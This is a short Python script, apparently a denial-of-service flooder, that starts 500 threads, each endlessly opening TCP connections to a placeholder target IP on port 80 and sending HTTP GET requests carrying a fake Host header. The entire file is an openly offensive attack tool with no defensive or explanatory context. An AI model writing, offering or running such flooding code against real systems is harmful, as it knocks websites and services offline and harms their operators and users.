import socket
import threading

target = "hedef_ip_adresi"
port = 80
fake_ip = "192.168.1.1"

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        s.close()

for _ in range(500):
    thread = threading.Thread(target=attack)
    thread.start()